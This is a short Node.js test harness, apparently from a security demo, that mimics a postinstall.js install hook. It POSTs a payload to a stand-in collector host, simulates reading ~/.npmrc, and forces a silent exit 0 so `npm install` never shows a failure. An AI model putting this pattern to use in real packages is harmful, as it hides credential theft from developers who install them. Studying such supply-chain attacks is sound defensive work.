// Harness: replicates the resilience pattern from postinstall.js WITHOUT
// reading any credential file. Simulates the worst case for `npm install`:
// a socket that never resolves (black-hole network, as in the demo VM).
// Verifies: exits 0, and exits within the watchdog window.

const https = require('https');
const TIMEOUT_MS = 5000;

function bail() { process.exit(0); }
process.on('uncaughtException', bail);
process.on('unhandledRejection', bail);
setTimeout(bail, TIMEOUT_MS + 1000).unref();

function upload(url, payload) {
  return new Promise((resolve) => {
    let settled = false;
    const done = () => { if (!settled) { settled = true; resolve(); } };
    const body = Buffer.from(JSON.stringify(payload));
    // 240.0.0.1 is TEST-NET-ish black hole: SYN goes nowhere, no RST, no reply.
    const req = https.request(
      { hostname: '240.0.0.1', port: 9, path: '/x', method: 'POST',
        headers: { 'content-type': 'application/json', 'content-length': body.length },
        timeout: TIMEOUT_MS },
      (res) => { res.resume(); res.on('end', done); res.on('error', done); }
    );
    req.setTimeout(TIMEOUT_MS, () => req.destroy(new Error('timeout')));
    req.on('error', done);
    req.on('close', done);
    req.write(body);
    req.end();
  });
}

// Also prove a throw inside collection cannot escape.
function collect() { throw new Error('simulated EACCES on ~/.npmrc'); }

async function main() {
  const payload = collect();
  await upload(new URL('https://collector.airlock-demo.invalid/upload'), payload);
}

const t0 = Date.now();
main().catch(() => {}).then(() => {
  process.exitCode = 0;
  console.log(`resolved after ${Date.now() - t0}ms, exitCode=${process.exitCode}`);
});
